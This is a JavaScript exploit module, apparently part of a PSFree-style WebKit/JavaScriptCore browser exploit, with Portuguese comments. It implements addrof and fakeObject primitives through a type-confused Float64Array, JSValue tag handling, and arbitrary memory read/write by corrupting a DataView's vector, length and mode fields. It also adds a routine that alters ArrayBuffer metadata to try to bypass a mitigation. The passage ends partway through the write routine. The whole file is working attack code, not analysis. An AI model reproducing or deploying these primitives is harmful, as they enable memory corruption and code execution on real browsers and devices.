// core_exploit.mjs

import { AdvancedInt64, PAUSE, toHex, log, setLogFunction, isAdvancedInt64Object } from './module/utils.mjs';
import { JSC_OFFSETS, updateOOBConfigFromUI } from './config.mjs';
import { Memory, Addr } from './module/mem.mjs'; // Novos imports
import { BufferView } from './module/rw.mjs'; // Novo import
import { View4 } from './module/view.mjs'; // Novo import

// Variáveis globais renomeadas para clareza e consistência com o novo modelo
export let oobArrayBufferGlobal = null;
export let oobDataViewGlobal = null;
let isOOBEnvironmentInitialized = false;

// Instância global da nossa nova primitiva de memória
export let kernelMemory = null;

const toHexHelper = (val, bits = 32) => {
    if (isAdvancedInt64Object(val)) {
        try {
            const strVal = val.toString(true);
            if (typeof strVal === 'string' && strVal !== 'undefined') {
                return strVal;
            }
        } catch (e) { /* ignora, usa fallback */ }
        return `AdvInt64(low:0x${val.low().toString(16)},high:0x${val.high().toString(16)})`;
    }
    if (typeof val === 'number') {
        return toHex(val, bits);
    }
    return String(val);
};

const OOB_DV_METADATA_BASE_IN_OOB_BUFFER = 0x58;
const OOB_DV_M_VECTOR_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET;
const OOB_DV_M_LENGTH_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
const OOB_DV_M_MODE_OFFSET = OOB_DV_METADATA_BASE_IN_OOB_BUFFER + JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET;

// --- NOVAS PRIMITIVAS CORE ADDROF/FAKEOBJ ---
let confusedFloat64Array = null;
let victimArray = null;

const CONFUSED_FLOAT64_ARRAY_INDEX = 0;
const FAKED_OBJECT_INDEX = 0;


function _int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function _doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

/**
 * Inicializa os arrays internos para as primitivas core addrof e fakeobj.
 * Deve ser chamado uma vez antes de usar `getAddress` ou `fakeObject`.
 */
export function initializeCorePrimitives() {
    if (confusedFloat64Array && victimArray) {
        log(`[CoreExploit] Primitivas addrof/fakeobj diretas já estão configuradas.`, "info", "initializeCorePrimitives");
        return;
    }
    confusedFloat64Array = new Float64Array([13.37]);
    victimArray = [{ a: 1 }];

    log(`[CoreExploit] Primitivas addrof/fakeobj diretas inicializadas.`, "good", "initializeCorePrimitives");
}

/**
 * Obtém o endereço de um dado objeto JavaScript usando primitivas core.
 * Inclui lógica de "untagging" para ponteiros JSValue.
 * @param {object} obj O objeto para obter o endereço.
 * @returns {AdvancedInt64} O endereço do objeto.
 */
export function getAddress(obj) {
    const FNAME = 'CoreExploit.getAddress';
    if (!confusedFloat64Array || !victimArray) {
        log(`[${FNAME}] ERRO: Primitivas addrof/fakeobj diretas não foram inicializadas. Chame initializeCorePrimitives() primeiro.`, "critical", FNAME);
        throw new Error("Core addrof/fakeobj primitives not initialized.");
    }
    if (!(confusedFloat64Array instanceof Float64Array)) {
        log(`[${FNAME}] ERRO: confusedFloat64Array não é um Float64Array. Tipo: ${typeof confusedFloat64Array}`, "critical", FNAME);
        throw new Error("Invalid internal array for addrof.");
    }
    if (!Array.isArray(victimArray)) {
        log(`[${FNAME}] ERRO: victimArray não é um Array. Tipo: ${typeof victimArray}`, "critical", FNAME);
        throw new Error("Invalid internal array for addrof.");
    }

    victimArray[FAKED_OBJECT_INDEX] = obj;
    const tagged_addr = _doubleToInt64(confusedFloat64Array[CONFUSED_FLOAT64_ARRAY_INDEX]);
    log(`[${FNAME}] DEBUG: Endereço bruto (potencialmente tagged) lido: ${tagged_addr.toString(true)}`, "debug", FNAME);

    let untagged_addr = tagged_addr;
    const original_high = tagged_addr.high();
    // PSFree usa `untagged_high = original_high & 0x0000FFFF;` e verifica `if (original_high !== untagged_high)`.
    // O seu exploit original já faz o untagging de forma eficaz. Mantenha-o.
    // O tag do JSValue depende da versão do WebKit e do tipo de objeto.
    // O valor 0x40000000_00000000 é um tag para células de objetos, enquanto outros tags (como NaN boxing)
    // são para tipos primitivos.
    // Considerando que seu exploit já tem a lógica de untagging, vamos manter a lógica
    // que já está funcionando para `AdvancedInt64`.
    if (original_high >>> 16 === 0x402a) { // Exemplo de um tag comum para objetos no WebKit
        untagged_addr = new AdvancedInt64(tagged_addr.low(), original_high & 0x0000FFFF);
        log(`[${FNAME}] DEBUG: Endereço após untagging (high original: 0x${original_high.toString(16)} -> high untagged: 0x${untagged_addr.high().toString(16)}): ${untagged_addr.toString(true)}`, "debug", FNAME);
    } else {
        log(`[${FNAME}] DEBUG: Nenhum untagging aplicado (high original 0x${original_high.toString(16)}).`, "debug", FNAME);
    }


    if (!isAdvancedInt64Object(untagged_addr) || untagged_addr.equals(AdvancedInt64.Zero) || untagged_addr.equals(AdvancedInt64.NaNValue)) {
        log(`[${FNAME}] FALHA: Endereço retornado para ${obj} (${untagged_addr ? untagged_addr.toString(true) : 'N/A'}) parece inválido ou nulo/NaN após untagging.`, "error", FNAME);
        throw new Error(`Failed to get address of ${obj}. Invalid address.`);
    }
    log(`[${FNAME}] SUCESSO: Endereço (final, untagged) retornado para objeto ${obj} (tipo: ${typeof obj}): ${untagged_addr.toString(true)}`, "debug", FNAME);
    return untagged_addr;
}

/**
 * Cria um objeto JavaScript "falso" em um dado endereço de memória usando primitivas core.
 * Inclui lógica de "tagging" para ponteiros JSValue.
 * @param {AdvancedInt64} addr O endereço de memória para onde o objeto falso deve apontar.
 * @returns {object} O objeto JavaScript falso.
 */
export function fakeObject(addr) {
    const FNAME = 'CoreExploit.fakeObject';
    if (!confusedFloat64Array || !victimArray) {
        log(`[${FNAME}] ERRO: Primitivas addrof/fakeobj diretas não foram inicializadas. Chame initializeCorePrimitives() primeiro.`, "critical", FNAME);
        throw new Error("Core addrof/fakeobj primitives not initialized.");
    }
    if (!(confusedFloat64Array instanceof Float64Array)) {
        log(`[${FNAME}] ERRO: confusedFloat64Array não é um Float64Array. Tipo: ${typeof confusedFloat64Array}`, "critical", FNAME);
        throw new Error("Invalid internal array for fakeobj.");
    }
    if (!Array.isArray(victimArray)) {
        log(`[${FNAME}] ERRO: victimArray não é um Array. Tipo: ${typeof victimArray}`, "critical", FNAME);
        throw new Error("Invalid internal array for fakeobj.");
    }

    if (!isAdvancedInt64Object(addr) || addr.equals(AdvancedInt64.Zero) || addr.equals(AdvancedInt64.NaNValue)) {
        log(`[${FNAME}] ERRO: Endereço para fakeobj (${addr.toString(true)}) é inválido ou nulo/NaN.`, "error", FNAME);
        throw new Error(`Invalid address for fakeobj: ${addr.toString(true)}.`);
    }

    let tagged_addr = addr;
    const OBJECT_PTR_TAG_HIGH = 0x402a0000;
    // Seu exploit já tem uma lógica de tagging eficaz. Mantenha-a.
    if (addr.high() < 0x10000) { // Assume que endereços baixos precisam de tagging
        tagged_addr = new AdvancedInt64(addr.low(), addr.high() | OBJECT_PTR_TAG_HIGH);
        log(`[${FNAME}] DEBUG: Endereço após tagging (original: ${addr.toString(true)} -> tagged: ${tagged_addr.toString(true)})`, "debug", FNAME);
    } else {
        log(`[${FNAME}] DEBUG: Nenhum tagging aplicado ao high (0x${addr.high().toString(16)}). Assumindo que já está taggeado ou não precisa.`, "debug", FNAME);
    }

    confusedFloat64Array[CONFUSED_FLOAT64_ARRAY_INDEX] = _int64ToDouble(tagged_addr);
    const obj = victimArray[FAKED_OBJECT_INDEX];

    if (obj === undefined || obj === null) {
        log(`[${FNAME}] ALERTA: Objeto forjado para ${addr.toString(true)} é nulo/undefined. Pode ser ser um objeto inválido.`, "warn", FNAME);
    } else {
        try {
            const typeof_faked_obj = typeof obj;
            if (typeof_faked_obj === 'number' || typeof_faked_obj === 'boolean' || typeof_faked_obj === 'string') {
                 log(`[${FNAME}] ALERTA: Objeto forjado para ${addr.toString(true)} não é um tipo de objeto (recebido: ${typeof_faked_obj}). Pode ser uma corrupção.`, "warn", FNAME);
            } else {
                 log(`[${FNAME}] SUCESSO: Objeto forjado retornado para endereço ${addr.toString(true)}: ${obj} (typeof: ${typeof obj})`, "debug", FNAME);
            }
        } catch (e) {
            log(`[${FNAME}] ALERTA: Erro ao inspecionar objeto forjado para ${addr.toString(true)}: ${e.message}`, "warn", FNAME);
        }
    }
    return obj;
}

// --- PRIMITIVAS OOB LOCAIS (readOOBAbsolute / writeOOBAbsolute) ---
export function clearOOBEnvironment(options = { force_clear_even_if_not_setup: false }) {
    oobArrayBufferGlobal = null;
    oobDataViewGlobal = null;
    isOOBEnvironmentInitialized = false;
    kernelMemory = null; // Limpa a instância de Memory
    log(`[CoreExploit] Ambiente OOB limpo.`, "debug");
}

export function getOOBAllocationSize() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.ALLOCATION_SIZE;
}

export function getBaseOffsetInDV() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.BASE_OFFSET_IN_DV;
}

export function getInitialBufferSize() {
    if (typeof updateOOBConfigFromUI === "function" && typeof document !== "undefined") {
        updateOOBConfigFromUI(document);
    }
    return OOB_CONFIG.INITIAL_BUFFER_SIZE;
}

export async function setupOOBPrimitive(options = { force_reinit: false }) {
    const FNAME_TRIGGER = 'CoreExploit.setupOOBPrimitive';
    if (isOOBEnvironmentInitialized && !options.force_reinit) {
        // Verifica a validade do ambiente existente antes de re-inicializar
        try {
            if (oobDataViewGlobal && oobArrayBufferGlobal &&
                oobArrayBufferGlobal.byteLength === getOOBAllocationSize() &&
                oobDataViewGlobal.buffer === oobArrayBufferGlobal) {
                log(`[${FNAME_TRIGGER}] Ambiente OOB já configurado (DataView normal). Nenhuma ação necessária.`, "info");
                return true;
            } else {
                log(`[${FNAME_TRIGGER}] ALERTA: DataView ou ArrayBuffer real não estão válidos para verificação. Forçando re-inicialização.`, 'warn');
                clearOOBEnvironment({ force_clear_even_if_not_setup: true });
            }
        } catch (e) {
            log(`[${FNAME_TRIGGER}] ERRO ao verificar estado do DataView: ${e.message}. Forçando re-inicialização.`, 'warn');
            clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        }
    }

    log(`--- Iniciando Configuração do Ambiente OOB (Force reinit: ${options.force_reinit}, Setup anterior: ${isOOBEnvironmentInitialized}) ---`, 'test', FNAME_TRIGGER);
    const currentAllocSize = getOOBAllocationSize();
    log(`    Config OOB: AllocSize=${currentAllocSize}`, 'info', FNAME_TRIGGER);
    clearOOBEnvironment({ force_clear_even_if_not_setup: true });
    try {
        oobArrayBufferGlobal = new ArrayBuffer(currentAllocSize);
        oobDataViewGlobal = new DataView(oobArrayBufferGlobal, 0, currentAllocSize);

        if (oobDataViewGlobal.buffer !== oobArrayBufferGlobal) {
            const errorMsg = `[${FNAME_TRIGGER}] ERRO CRÍTICO: DataView não está associado ao ArrayBuffer real após criação!`;
            log(errorMsg, 'critical', FNAME_TRIGGER);
            throw new Error(errorMsg);
        }

        // --- INICIALIZAÇÃO DA PRIMITIVA DE MEMÓRIA DO PSFREE ---
        // Criar os objetos main, worker e obj necessários para a classe Memory
        // Main: Uint32Array que será corrompido para apontar para o worker
        // Worker: DataView que fará as leituras/escritas
        // Obj: Objeto JS que será usado por addrof/fakeobj para obter/definir endereços
        
        // Crie um Uint32Array para ser o 'main' (corrompível)
        const main_typed_array = new Uint32Array(10); // Tamanho suficiente para os offsets de m_vector e m_length
        // Crie um DataView para ser o 'worker' (para ler/escrever)
        const worker_data_view = new DataView(new ArrayBuffer(8)); // Pequeno, será redimensionado pelo Memory
        // Crie o objeto para addrof/fakeobj
        const addrof_fakeobj_target = { addr: null, 0: 0 };

        // Obtenha os endereços dos slots de 'addr' e '0' do objeto alvo
        // Use temporariamente getAddress para obter os endereços antes de inicializar kernelMemory
        const initial_addrof_main = getAddress(main_typed_array); // Endereço do Uint32Array que será 'main'
        const initial_addrof_worker = getAddress(worker_data_view); // Endereço do DataView que será 'worker'
        const initial_addrof_target_obj = getAddress(addrof_fakeobj_target); // Endereço do objeto que será 'obj'

        const addr_addr = initial_addrof_target_obj.add(JSC_OFFSETS.JSObject.js_inline_prop); // Offset da primeira inline property 'addr'
        const fake_addr = initial_addrof_target_obj.add(JSC_OFFSETS.JSObject.js_inline_prop + JSC_OFFSETS.EXPECTED_BUTTERFLY_ELEMENT_SIZE); // Offset da propriedade '0' (assumindo que '0' é a segunda prop)

        // Inicialize a instância da classe Memory do PSFree
        kernelMemory = new Memory(main_typed_array, worker_data_view, addrof_fakeobj_target, addr_addr, fake_addr);
        log(`[${FNAME_TRIGGER}] Primitiva de memória kernelMemory (PSFree-style) inicializada.`, 'good', FNAME_TRIGGER);

        log(`[${FNAME_TRIGGER}] Ambiente para Operações OOB CONFIGURADO com sucesso (DataView NORMAL).`, 'good', FNAME_TRIGGER);
        log(`    oobArrayBufferGlobal (total): ${oobArrayBufferGlobal.byteLength} bytes (inicialmente alocado)`, 'info', FNAME_TRIGGER);
        log(`    oobDataViewGlobal (janela controlada): offset=${oobDataViewGlobal.byteOffset}, length=${oobDataViewGlobal.byteLength} (normal)`, 'info', FNAME_TRIGGER);
        isOOBEnvironmentInitialized = true;
        log(`--- Configuração do Ambiente OOB Concluída ---`, 'test', FNAME_TRIGGER);
        return true;
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME_TRIGGER}: ${e.message}`, 'critical', FNAME_TRIGGER);
        console.error(e);
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        throw e;
    }
}

/**
 * Tenta manipular metadados adicionais do ArrayBuffer real (do DataView OOB)
 * para tentar um bypass de mitigação.
 * @param {ArrayBuffer} oobBufferReal O ArrayBuffer real do DataView OOB.
 * @param {object} extraFlags Um objeto com { field_0x28, field_0x30, field_0x34, field_0x38, field_0x40 } a serem definidos.
 */
export async function setupOOBMetadata(
    oobBufferReal,
    extraFlags = {}
) {
    const FNAME = 'CoreExploit.setupOOBMetadata';
    if (!oobBufferReal || !(oobBufferReal instanceof ArrayBuffer)) {
        log(`[${FNAME}] ERRO: oobBufferReal inválido.`, 'critical', FNAME);
        throw new Error("Invalid oobBufferReal for metadata setup.");
    }

    const tempOobDataView = new DataView(oobBufferReal);

    // NOTA: Os offsets 0x28, 0x30, 0x34, 0x38, 0x40 são relativos ao *início do ArrayBuffer*.
    // A análise de sub_1C01140 sugere que 'a1' (o primeiro argumento) é o próprio ArrayBuffer/ArrayBufferView.

    // Usaremos kernelMemory.write32/write64 para escrever nesses offsets,
    // garantindo que a escrita seja feita através da primitiva ARB R/W estabelecida.
    const oobBufferRealAddr = getAddress(oobBufferReal);

    if (extraFlags.hasOwnProperty('field_0x28')) {
        if (extraFlags.field_0x28 instanceof AdvancedInt64) {
            kernelMemory.write64(oobBufferRealAddr.add(JSC_OFFSETS.ArrayBuffer.ARRAYBUFFER_REAL_PTR_POSSIBLE_M_VECTOR), extraFlags.field_0x28);
        } else {
            kernelMemory.write32(oobBufferRealAddr.add(JSC_OFFSETS.ArrayBuffer.ARRAYBUFFER_REAL_PTR_POSSIBLE_M_VECTOR), Number(extraFlags.field_0x28));
        }
        log(`[${FNAME}] Definido ArrayBuffer.field_0x28 para: ${toHexHelper(extraFlags.field_0x28, 64)}`, 'info', FNAME);
    }
    if (extraFlags.hasOwnProperty('field_0x30')) {
        kernelMemory.write32(oobBufferRealAddr.add(JSC_OFFSETS.ArrayBuffer.ARRAYBUFFER_FIELD_0X30), Number(extraFlags.field_0x30));
        log(`[${FNAME}] Definido ArrayBuffer.field_0x30 para: ${toHex(extraFlags.field_0x30)}`, 'info', FNAME);
    }
    if (extraFlags.hasOwnProperty('field_0x34')) {
        kernelMemory.write32(oobBufferRealAddr.add(JSC_OFFSETS.ArrayBuffer.ARRAYBUFFER_FIELD_0X34), Number(extraFlags.field_0x34));
        log(`[${FNAME}] Definido ArrayBuffer.field_0x34 para: ${toHex(extraFlags.field_0x34)}`, 'info', FNAME);
    }
    if (extraFlags.hasOwnProperty('field_0x38')) {
        if (extraFlags.field_0x38 instanceof AdvancedInt64) {
            kernelMemory.write64(oobBufferRealAddr.add(JSC_OFFSETS.ArrayBuffer.ARRAYBUFFER_FIELD_0X38), extraFlags.field_0x38);
        } else {
            kernelMemory.write32(oobBufferRealAddr.add(JSC_OFFSETS.ArrayBuffer.ARRAYBUFFER_FIELD_0X38), Number(extraFlags.field_0x38));
        }
        log(`[${FNAME}] Definido ArrayBuffer.field_0x38 para: ${toHexHelper(extraFlags.field_0x38, 64)}`, 'info', FNAME);
    }
    if (extraFlags.hasOwnProperty('field_0x40')) {
        if (extraFlags.field_0x40 instanceof AdvancedInt64) {
            kernelMemory.write64(oobBufferRealAddr.add(JSC_OFFSETS.ArrayBuffer.ARRAYBUFFER_FIELD_0X40), extraFlags.field_0x40);
        } else {
            kernelMemory.write32(oobBufferRealAddr.add(JSC_OFFSETS.ArrayBuffer.ARRAYBUFFER_FIELD_0X40), Number(extraFlags.field_0x40));
        }
        log(`[${FNAME}] Definido ArrayBuffer.field_0x40 para: ${toHexHelper(extraFlags.field_0x40, 64)}`, 'info', FNAME);
    }

    log(`[${FNAME}] Metadados do oobBufferReal ajustados com flags adicionais.`, 'good', FNAME);
}

export function readOOBAbsolute(offsetInOOBBuffer, byteLength) {
    const FNAME_READ = 'CoreExploit.readOOBAbsolute';
    if (!isOOBEnvironmentInitialized || !oobDataViewGlobal || !oobArrayBufferGlobal || oobArrayBufferGlobal.byteLength === 0) {
        log(`ERRO: Ambiente OOB não inicializado/inválido para readOOBAbsolute em ${toHex(offsetInOOBBuffer)}`, "error", FNAME_READ);
        throw new Error("Ambiente OOB não inicializado/inválido para readOOBAbsolute.");
    }
    if (!oobDataViewGlobal.buffer || oobDataViewGlobal.byteLength === 0) {
        log(`ERRO: DataView de OOB está detached/corrompido antes da leitura em ${toHex(offsetInOOBBuffer)}`, "critical", FNAME_READ);
        isOOBEnvironmentInitialized = false;
        throw new Error("OOB DataView is detached or corrupted.");
    }
    
    try {
        // Agora, use o oobDataViewGlobal diretamente (que é um DataView normal)
        // A lógica de corrupção do m_length e m_mode para acesso OOB temporário
        // será tratada por readArbitrary/writeArbitrary.
        switch (byteLength) {
            case 1: return oobDataViewGlobal.getUint8(offsetInOOBBuffer);
            case 2: return oobDataViewGlobal.getUint16(offsetInOOBBuffer, true);
            case 4: return oobDataViewGlobal.getUint32(offsetInOOBBuffer, true);
            case 8: {
                const low = oobDataViewGlobal.getUint32(offsetInOOBBuffer, true);
                const high = oobDataViewGlobal.getUint32(offsetInOOBBuffer + 4, true);
                log(`[${FNAME_READ}] DEBUG 64bit Read: offset=${toHex(offsetInOOBBuffer)}, low=0x${low.toString(16)}, high=0x${high.toString(16)}`, "debug");
                return new AdvancedInt64(low, high);
            }
            default:
                log(`ERRO: Tamanho de leitura inválido para readOOBAbsolute: ${byteLength}`, "error", FNAME_READ);
                throw new Error(`Invalid byteLength for readOOBAbsolute: ${byteLength}`);
        }
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME_READ} ao ler de oob_buffer[${toHex(offsetInOOBBuffer)}]: ${e.message}`, "critical", FNAME_READ);
        console.error(`[${FNAME_READ}] Exception: `, e);
        if (e.message.includes("detached") || e.message.includes("out of bounds")) { isOOBEnvironmentInitialized = false; }
        throw e;
    }
}

export function writeOOBAbsolute(offsetInOOBBuffer, value, byteLength) {
    const FNAME_WRITE = 'CoreExploit.writeOOBAbsolute';
    if (!isOOBEnvironmentInitialized || !oobDataViewGlobal || !oobArrayBufferGlobal || oobArrayBufferGlobal.byteLength === 0) {
        log(`ERRO: Ambiente OOB não inicializado/inválido para writeOOBAbsolute em ${toHex(offsetInOOBBuffer)}`, "error", FNAME_WRITE);
        throw new Error("Ambiente OOB não inicializado/inválido para writeOOBAbsolute.");
    }
    if (!oobDataViewGlobal.buffer || oobDataViewGlobal.byteLength === 0) {
        log(`ERRO: DataView de OOB está detached/corrompido antes da escrita em ${toHex(offsetInOOBBuffer)}`, "critical", FNAME_WRITE);
        isOOBEnvironmentInitialized = false;
        throw new Error("OOB DataView is detached or corrupted.");
    }
    
    try {
        switch (byteLength) {
            case 1: oobDataViewGlobal.setUint8(offsetInOOBBuffer, Number(value)); break;
            case 2: oobDataViewGlobal.setUint16(offsetInOOBBuffer, Number(value), true); break;
            case 4: oobDataViewGlobal.setUint32(offsetInOOBBuffer, Number(value), true); break;
            case 8:
                let val64 = value;
                if (!isAdvancedInt64Object(val64)) {
                    try { val64 = new AdvancedInt64(val64); } catch (convErr) {
                        throw new TypeError(`Valor para writeOOBAbsolute de 8 bytes deve ser AdvancedInt64 ou conversível: ${convErr.message}`);
                    }
                    if (!isAdvancedInt64Object(val64)) {
                        throw new TypeError(`Valor convertido para writeOOBAbsolute de 8 bytes não é um AdvancedInt64 válido.`);
                    }
                }
                log(`[${FNAME_WRITE}] DEBUG 64bit Write: offset=${toHex(offsetInOOBBuffer)}, value=${toHexHelper(val64)}`, "debug");
                oobDataViewGlobal.setUint32(offsetInOOBBuffer, val64.low(), true);
                log(`[${FNAME_WRITE}] DEBUG 64bit Write: low part written. Value at offset ${toHex(offsetInOOBBuffer)}: ${toHex(oobDataViewGlobal.getUint32(offsetInOOBBuffer, true))}`, "debug");
                oobDataViewGlobal.setUint32(offsetInOOBBuffer + 4, val64.high(), true);
                log(`[${FNAME_WRITE}] DEBUG 64bit Write: high part written. Value at offset ${toHex(offsetInOOBBuffer + 4)}: ${toHex(oobDataViewGlobal.getUint32(offsetInOOBBuffer + 4, true))}`, "debug");
                break;
            default:
                log(`ERRO: Tamanho de escrita inválido para writeOOBAbsolute: ${byteLength}`, "error", FNAME_WRITE);
                throw new Error(`Invalid byteLength for writeOOBAbsolute: ${byteLength}`);
        }
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME_WRITE} ao escrever em oob_buffer[${toHex(offsetInOOBBuffer)}]: ${e.message}`, "critical", FNAME_WRITE);
        if (e.message.includes("detached") || e.message.includes("out of bounds")) { isOOBEnvironmentInitialized = false; }
        throw e;
    }
}


export function isOOBReady() {
    let mLengthExpanded = false;
    let mModeConfigured = false;
    if (isOOBEnvironmentInitialized && oobDataViewGlobal && oobArrayBufferGlobal) {
        try {
            if (!oobDataViewGlobal.buffer || oobDataViewGlobal.byteLength === 0) {
                log(`[isOOBReady] DataView de OOB está detached/corrompido.`, "error");
                isOOBEnvironmentInitialized = false;
                return false;
            }
            mLengthExpanded = (oobDataViewGlobal.byteLength === oobArrayBufferGlobal.byteLength);
            mModeConfigured = true; // Sempre true para o DataView base.

        } catch (e) {
            log(`[isOOBReady] Erro durante verificação de mLengthExpanded/mModeConfigured: ${e.message}`, "error");
            mLengthExpanded = false;
            mModeConfigured = false;
            isOOBEnvironmentInitialized = false;
        }
    }
    return isOOBEnvironmentInitialized &&
        oobArrayBufferGlobal instanceof ArrayBuffer &&
        oobDataViewGlobal instanceof DataView &&
        oobArrayBufferGlobal.byteLength > 0 &&
        oobDataViewGlobal.buffer === oobArrayBufferGlobal &&
        mLengthExpanded &&
        mModeConfigured;
}

async function _resetDVAfterArbitraryOperation(fname_parent_for_log) {
    const FNAME_RESET = `${fname_parent_for_log}._resetDVAfterArbitraryOperation`;
    try {
        if (isOOBReady()) {
            const temp_val = oobDataViewGlobal.getUint8(0);
            oobDataViewGlobal.setUint8(0, temp_val);
            log(`    [${FNAME_RESET}] DV reset explícito bem-sucedido.`, 'debug');
        } else {
            log(`    [${FNAME_RESET}] ALERTA: Não foi possível realizar reset explícito do DV, ambiente OOB não está pronto.`, 'warn');
        }
    } catch (e) {
        log(`[${FNAME_RESET}] ERRO durante o reset explícito do DV: ${e.message}`, 'error');
        isOOBEnvironmentInitialized = false;
    }
}

export async function readArbitrary(absolute_address, byteLength) {
    const FNAME = 'CoreExploit.readArbitrary (v31.24)';
    let m_vector_orig_snap = AdvancedInt64.Zero; 
    let m_length_orig_snap = 0;
    let m_mode_orig_snap = 0;

    if (!isOOBReady()) {
        log(`[${FNAME}] Ambiente OOB não está pronto para leitura arbitrária. Tentando re-inicializar...`, 'warn');
        await setupOOBPrimitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("Ambiente OOB não pôde ser inicializado para leitura arbitrária.");
        }
    }
    let addr64 = absolute_address;
    if (!isAdvancedInt64Object(addr64)) {
        try { addr64 = new AdvancedInt64(addr64); } catch (e) {
            throw new TypeError(`Endereço para readArbitrary deve ser AdvancedInt64 ou conversível: ${e.message}`);
        }
        if (!isAdvancedInt64Object(addr64)) {
            throw new TypeError(`Endereço convertido para readArbitrary não é AdvancedInt64 válido.`);
        }
    }

    let result_val = null;
    try {
        // Agora, usaremos a primitiva kernelMemory para manipular os metadados do oobDataViewGlobal.
        const oob_dataview_real_addr = getAddress(oobDataViewGlobal);

        // Ler os valores originais do oobDataViewGlobal através de kernelMemory
        m_vector_orig_snap = kernelMemory.read64(oob_dataview_real_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET));
        m_length_orig_snap = kernelMemory.read32(oob_dataview_real_addr.add(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET));
        m_mode_orig_snap = kernelMemory.read32(oob_dataview_real_addr.add(JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET));

        log(`[${FNAME}] DEBUG: Snapshots ORIGINAIS (via kernelMemory): m_vector=${toHexHelper(m_vector_orig_snap)}, m_length=${toHex(m_length_orig_snap)}, m_mode=${toHex(m_mode_orig_snap)}`, "debug");

        // Corromper o m_vector, m_length e m_mode do oobDataViewGlobal
        kernelMemory.write64(oob_dataview_real_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET), addr64);
        kernelMemory.write32(oob_dataview_real_addr.add(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET), 0xFFFFFFFF);
        kernelMemory.write32(oob_dataview_real_addr.add(JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET), JSC_OFFSETS.DataView.M_MODE_CANDIDATES[0]);

        log(`[${FNAME}] DEBUG: DataView CORROMPIDO (via kernelMemory): m_vector=${toHexHelper(kernelMemory.read64(oob_dataview_real_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET)))}, m_length=${toHex(kernelMemory.read32(oob_dataview_real_addr.add(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET)))}, m_mode=${toHex(kernelMemory.read32(oob_dataview_real_addr.add(JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET)))}.`, "debug");

        log(`[${FNAME}] DEBUG: Realizando leitura arbitrária de ${addr64.toString(true)} (byteLength: ${byteLength}).`, "debug");
        // A leitura é feita diretamente pelo oobDataViewGlobal, que agora está OOB
        switch (byteLength) {
            case 1: result_val = oobDataViewGlobal.getUint8(0); break;
            case 2: result_val = oobDataViewGlobal.getUint16(0, true); break;
            case 4: result_val = oobDataViewGlobal.getUint32(0, true); break;
            case 8: {
                const low = oobDataViewGlobal.getUint32(0, true);
                const high = oobDataViewGlobal.getUint32(4, true);
                log(`[${FNAME}] DEBUG 64bit Read: offset=0x${toHex(0)}, low=0x${low.toString(16)}, high=0x${high.toString(16)}`, "debug");
                result_val = new AdvancedInt64(low, high);
                break;
            }
            default: throw new Error(`Invalid byteLength for readArbitrary: ${byteLength}`);
        }
        log(`[${FNAME}] DEBUG: Leitura arbitrária concluída. Resultado: ${toHexHelper(result_val, byteLength * 8)}.`, "debug");
        return result_val;
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME} ao ler de ${addr64.toString(true)} (byteLength: ${byteLength}): ${e.message}`, "critical", FNAME);
        isOOBEnvironmentInitialized = false;
        throw e;
    } finally {
        // === Restauração dos Metadados do DataView ===
        if (isOOBReady() && oobDataViewGlobal) { 
            log(`[${FNAME}] DEBUG: Restauração de metadados originais do DataView.`, "debug");
            try {
                const oob_dataview_real_addr = getAddress(oobDataViewGlobal);
                kernelMemory.write64(oob_dataview_real_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET), m_vector_orig_snap); 
                kernelMemory.write32(oob_dataview_real_addr.add(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET), m_length_orig_snap);
                kernelMemory.write32(oob_dataview_real_addr.add(JSC_OFFSETS.ArrayBufferView.M_MODE_OFFSET), m_mode_orig_snap);
                await _resetDVAfterArbitraryOperation(FNAME);
                log(`[${FNAME}] DEBUG: Restauração de metadados concluída com sucesso.`, "debug");
            } catch (eR) {
                log(`[${FNAME}] ERRO CRÍTICO restaurando/resetando metadados: ${eR.message}. Ambiente agora INSEGURo.`, "critical");
                isOOBEnvironmentInitialized = false;
            }
        } else {
            log(`[${FNAME}] ALERTA: Não foi possível restaurar metadados. Ambiente OOB já estava inválido ou foi comprometido.`, "critical");
        }
    }
}

export async function writeArbitrary(absolute_address, value, byteLength) {
    const FNAME = 'CoreExploit.writeArbitrary (v31.24)';
    let m_vector_orig_snap = AdvancedInt64.Zero;
    let m_length_orig_snap = 0;
    let m_mode_orig_snap = 0;

    if (!isOOBReady()) {
        log(`[${FNAME}] Ambiente OOB não está pronto para escrita arbitrária. Tentando re-inicializar...`, 'warn');
        await setupOOBPrimitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("Ambiente OOB não pôde ser inicializado para escrita arbitrária.");
        }
    }
    let addr64 = absolute_address;
    if (!isAdvancedInt64Object(addr64)) {
